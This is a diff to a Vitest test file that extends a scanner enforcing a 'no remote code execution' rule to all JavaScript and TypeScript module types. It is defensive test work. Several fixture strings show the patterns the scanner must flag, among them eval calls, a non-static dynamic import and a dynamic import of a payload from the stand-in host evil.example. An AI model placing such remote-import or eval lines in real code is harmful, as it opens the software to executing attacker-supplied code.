@@ -1,10 +1,12 @@
-import { readFileSync, statSync } from 'node:fs';
-import { relative } from 'node:path';
+import { mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs';
+import { tmpdir } from 'node:os';
+import { join, relative } from 'node:path';
 import * as ts from 'typescript';
 import { describe, expect, it } from 'vitest';
 
 import {
   REPO_ROOT,
+  SOURCE_POLICY_EXTENSIONS,
   SRC_ROOT,
   type SourceFinding,
   classifyImportSpecifier,
@@ -13,10 +15,11 @@ import {
   isComputedGlobalWrapperAccess,
   isDynamicImportCall,
   isInTypePosition,
+  isSourcePolicyFile,
   lineText,
   parseSource,
   pathResolvesTo,
-  walkTsFiles,
+  walkSourceFiles,
 } from './source-policy';
 
 // PUL-Q007 — no remote code execution.
@@ -26,10 +29,11 @@ import {
 // mechanism that would execute code not present in the published
 // bundle."
 //
-// Enforcement: a Vitest source scan over `src/**/*.ts`. The scanner
-// flags every runtime-value reference to `eval` / `Function` and
-// every dynamic `import(...)` whose specifier is a remote URL or a
-// non-static expression. Type-position references (interface members
+// Enforcement: a Vitest source scan over executable source modules
+// under `src/`. The scanner flags every runtime-value reference to
+// `eval` / `Function` and every dynamic `import(...)` whose specifier
+// is a remote URL or a non-static expression. Type-position references
+// (interface members
 // named `eval`, `typeof eval` in a type alias, JSDoc
 // `{@link import('./mod').T}`) are intentionally NOT flagged — they
 // are compile-time artifacts and do not execute code at runtime.
@@ -173,6 +177,38 @@ function scanQ007(sourceFile: ts.SourceFile): readonly Q007Finding[] {
 
 describe('PUL-Q007 — no remote code execution (source scan)', () => {
   describe('scanner self-tests', () => {
+    describe('source file inventory', () => {
+      it('walks every executable source module extension and skips declarations/non-code', () => {
+        const root = mkdtempSync(join(tmpdir(), 'pulsar-source-policy-'));
+        try {
+          for (const ext of SOURCE_POLICY_EXTENSIONS) {
+            writeFileSync(join(root, `fixture${ext}`), 'export const ok = true;\n');
+          }
+          writeFileSync(join(root, 'fixture.d.ts'), 'export interface TypesOnly {}\n');
+          writeFileSync(join(root, 'fixture.css'), '.fixture { color: red; }\n');
+
+          const found = walkSourceFiles(root)
+            .map((file) => relative(root, file))
+            .sort();
+          const expected = SOURCE_POLICY_EXTENSIONS.map((ext) => `fixture${ext}`).sort();
+
+          expect(found).toEqual(expected);
+          expect(isSourcePolicyFile(join(root, 'fixture.js'))).toBe(true);
+          expect(isSourcePolicyFile(join(root, 'fixture.jsx'))).toBe(true);
+          expect(isSourcePolicyFile(join(root, 'fixture.ts'))).toBe(true);
+          expect(isSourcePolicyFile(join(root, 'fixture.tsx'))).toBe(true);
+          expect(isSourcePolicyFile(join(root, 'fixture.mjs'))).toBe(true);
+          expect(isSourcePolicyFile(join(root, 'fixture.mts'))).toBe(true);
+          expect(isSourcePolicyFile(join(root, 'fixture.cjs'))).toBe(true);
+          expect(isSourcePolicyFile(join(root, 'fixture.cts'))).toBe(true);
+          expect(isSourcePolicyFile(join(root, 'fixture.d.ts'))).toBe(false);
+          expect(isSourcePolicyFile(join(root, 'fixture.css'))).toBe(false);
+        } finally {
+          rmSync(root, { recursive: true, force: true });
+        }
+      });
+    });
+
     describe('direct constructions', () => {
       it.each([
         ['eval (value read)', "eval('1+2');"],
@@ -277,6 +313,25 @@ describe('PUL-Q007 — no remote code execution (source scan)', () => {
       it('does NOT flag a static package-name dynamic import', () => {
         const findings = findingsOf("import('howler');");
         expect(findings).toEqual([]);
+      });
+
+      it('flags eval and non-static dynamic import in a JavaScript source file', () => {
+        const findings = findingsOf(
+          "const url = './module.js'; eval('1+2'); import(url);",
+          'src/runtime/example.js',
+        );
+        expect(findings.map((f) => f.label)).toEqual([
+          'eval (value read)',
+          'dynamic import of non-static specifier',
+        ]);
+      });
+
+      it('flags remote dynamic import after JSX syntax in a JSX source file', () => {
+        const findings = findingsOf(
+          'const element = <div data-kind="fixture" />; import(\'https://evil.example/payload.js\');',
+          'src/scenes/example.jsx',
+        );
+        expect(findings.map((f) => f.label)).toContain('dynamic import of remote URL');
       });
 
       it('does NOT flag a no-substitution template-literal dynamic import of a local module', () => {
@@ -486,13 +541,13 @@ describe('PUL-Q007 — no remote code execution (source scan)', () => {
   });
 
   describe('runtime tree (current code revision)', () => {
-    it('scan root `src/` exists and contains at least one .ts file', () => {
+    it('scan root `src/` exists and contains at least one source module file', () => {
       expect(statSync(SRC_ROOT).isDirectory()).toBe(true);
-      expect(walkTsFiles(SRC_ROOT).length).toBeGreaterThan(0);
+      expect(walkSourceFiles(SRC_ROOT).length).toBeGreaterThan(0);
     });
 
-    it('contains no Q007 violations across `src/**/*.ts`', () => {
-      const files = walkTsFiles(SRC_ROOT);
+    it('contains no Q007 violations across executable source modules under `src/`', () => {
+      const files = walkSourceFiles(SRC_ROOT);
       const findings: Q007Finding[] = [];
       for (const file of files) {
         const text = readFileSync(file, 'utf-8');
